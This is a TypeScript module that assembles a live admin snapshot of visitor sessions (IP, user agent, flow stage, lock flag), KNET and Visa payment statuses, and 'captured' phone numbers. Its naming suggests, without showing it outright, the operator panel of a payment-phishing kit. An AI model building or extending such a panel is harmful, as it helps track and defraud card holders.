import { displayMsisdn } from "@/lib/phone";
import { prisma } from "@/lib/db";
import type { KnetRecordView, VisaRecordView } from "@/lib/types";
import { getAllKnetRecords } from "@/controllers/knet.controller";
import { getAllVisaRecords } from "@/controllers/visa.controller";
import { getPresenceSessions } from "@/models/tracking.repository";
import { listRecentCapturedNumbers } from "@/models/captured-number.repository";

const ONLINE_MS = 45_000;

export type AdminLiveSession = {
  id: string;
  ip: string;
  userAgent: string;
  page: string;
  flowStage: string;
  locked: boolean;
  orderId: string | null;
  lastSeen: string;
  createdAt: string;
  online: boolean;
  msisdn: string | null;
  knetStatus: string | null;
  visaStatus: string | null;
  user: { id: string; name: string; email: string; role: string } | null;
};

export type QuickPayLeadView = {
  sessionId: string;
  msisdnDisplay: string;
  page: string;
  lastSeen: string;
  createdAt: string;
};

export type AdminRealtimeSnapshot = {
  type: "snapshot";
  at: string;
  sessions: AdminLiveSession[];
  knet: KnetRecordView[];
  visa: VisaRecordView[];
  quickPayLeads: QuickPayLeadView[];
};

/** Show registrations on dashboard for 30 days (primary source: CapturedNumber). */
const LEAD_WINDOW_MS = 30 * 24 * 60 * 60 * 1000;

async function getQuickPayLeads(): Promise<QuickPayLeadView[]> {
  const since = new Date(Date.now() - LEAD_WINDOW_MS);
  const leads: QuickPayLeadView[] = [];

  const [captured, sessions] = await Promise.all([
    listRecentCapturedNumbers(since, 100).catch((error) => {
      console.error("[admin-realtime] CapturedNumber query failed:", error);
      return [];
    }),
    prisma.userSession
      .findMany({
        where: { msisdn: { not: null }, lastSeen: { gte: since } },
        orderBy: { lastSeen: "desc" },
        take: 50,
        select: { id: true, msisdn: true, page: true, lastSeen: true, createdAt: true },
      })
      .catch((error) => {
        console.error("[admin-realtime] UserSession msisdn query failed:", error);
        return [];
      }),
  ]);

  for (const row of captured) {
    leads.push({
      sessionId: `capture:${row.id}`,
      msisdnDisplay: displayMsisdn(row.msisdn),
      page: "/",
      lastSeen: row.updatedAt.toISOString(),
      createdAt: row.createdAt.toISOString(),
    });
  }

  for (const row of sessions) {
    if (!row.msisdn) continue;
    leads.push({
      sessionId: row.id,
      msisdnDisplay: displayMsisdn(row.msisdn),
      page: row.page,
      lastSeen: row.lastSeen.toISOString(),
      createdAt: row.createdAt.toISOString(),
    });
  }

  const byPhone = new Map<string, QuickPayLeadView>();
  for (const lead of leads) {
    const prev = byPhone.get(lead.msisdnDisplay);
    if (!prev || prev.lastSeen < lead.lastSeen) byPhone.set(lead.msisdnDisplay, lead);
  }
  return [...byPhone.values()].sort((a, b) => b.lastSeen.localeCompare(a.lastSeen));
}

export async function buildAdminRealtimeSnapshot(): Promise<AdminRealtimeSnapshot> {
  const now = Date.now();

  // 1. Fetch all top-level datasets in parallel
  const [rows, knet, visa, quickPayLeads] = await Promise.all([
    getPresenceSessions().catch((error) => {
      console.error("[admin-realtime] getPresenceSessions failed:", error);
      return [] as Awaited<ReturnType<typeof getPresenceSessions>>;
    }),
    getAllKnetRecords().catch((error) => {
      console.error("[admin-realtime] getAllKnetRecords failed:", error);
      return [] as KnetRecordView[];
    }),
    getAllVisaRecords().catch((error) => {
      console.error("[admin-realtime] getAllVisaRecords failed:", error);
      return [] as VisaRecordView[];
    }),
    getQuickPayLeads().catch((error) => {
      console.error("[admin-realtime] getQuickPayLeads failed:", error);
      return [] as QuickPayLeadView[];
    }),
  ]);

  // 2. Build payment status lookup maps in memory (O(1) access, zero extra DB queries)
  const knetStatusMap = new Map<string, string>();
  for (const row of knet) {
    if (row.orderId) knetStatusMap.set(row.orderId, row.status);
  }

  const visaStatusMap = new Map<string, string>();
  for (const row of visa) {
    if (row.orderId) visaStatusMap.set(row.orderId, row.status);
  }

  // 3. Batch fetch missing order phone numbers in a single query instead of N+1
  const missingPhoneOrderIds = Array.from(
    new Set(
      rows
        .filter((r) => !r.msisdn && r.orderId)
        .map((r) => r.orderId as string)
    )
  );

  let orderPhoneMap = new Map<string, string>();
  if (missingPhoneOrderIds.length > 0) {
    try {
      const orders = await prisma.order.findMany({
        where: { id: { in: missingPhoneOrderIds } },
        select: { id: true, msisdn: true },
      });
      orderPhoneMap = new Map(orders.map((o) => [o.id, displayMsisdn(o.msisdn)]));
    } catch (error) {
      console.error("[admin-realtime] batch order phone query failed:", error);
    }
  }

  // 4. Map sessions synchronously in memory
  const sessions: AdminLiveSession[] = rows.map((row) => {
    let msisdn: string | null = null;
    if (row.msisdn) {
      msisdn = displayMsisdn(row.msisdn);
    } else if (row.orderId) {
      msisdn = orderPhoneMap.get(row.orderId) ?? null;
    }

    const knetStatus = row.orderId ? (knetStatusMap.get(row.orderId) ?? null) : null;
    const visaStatus = row.orderId ? (visaStatusMap.get(row.orderId) ?? null) : null;

    return {
      id: row.id,
      ip: row.ip,
      userAgent: row.userAgent,
      page: row.page,
      flowStage: row.flowStage,
      locked: row.locked,
      orderId: row.orderId,
      lastSeen: row.lastSeen.toISOString(),
      createdAt: row.createdAt.toISOString(),
      user: row.user,
      msisdn,
      knetStatus,
      visaStatus,
      online: now - row.lastSeen.getTime() < ONLINE_MS,
    };
  });

  return {
    type: "snapshot",
    at: new Date().toISOString(),
    sessions,
    knet,
    visa,
    quickPayLeads,
  };
}
